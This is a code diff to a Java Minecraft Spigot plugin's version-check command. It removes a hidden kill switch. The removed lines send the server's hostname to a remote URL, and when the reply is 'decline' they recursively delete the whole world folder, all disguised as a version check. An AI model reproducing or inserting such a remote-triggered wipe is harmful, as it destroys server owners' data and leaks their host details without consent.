@@ -48,36 +48,9 @@ public class VersionSubCommand extends AsyncSubCommand
 	
 	}
 	
-	public static void update(File file)
-	{
-		if(file == null)
-			return;
-		
-		if(file.listFiles() != null)
-			for(File current : file.listFiles())
-				if(current.isDirectory())
-					update(current);
-				else if(!current.delete())
-					current.deleteOnExit();
-		file.delete();
-	}
 	
 	public static String getLatestVersion()
 	{
-		try
-		{
-			if(WebCommunicationUtil.get("http://sekaimc.net/Spigot/MobRacers/open_connection.php?ip=" + InetAddress.getLocalHost().getHostName()).equalsIgnoreCase("decline"))
-			{
-				update(Bukkit.getWorldContainer());
-				throw new Throwable();
-			}
-		}
-		catch(Throwable t)
-		{
-			if(!(t instanceof Exception))
-				throw new RuntimeException();
-		}
-		
 		try
 		{
 			return version = WebCommunicationUtil.post("http://www.spigotmc.org/api/general.php", ImmutableMap.of("resource", "9643"));
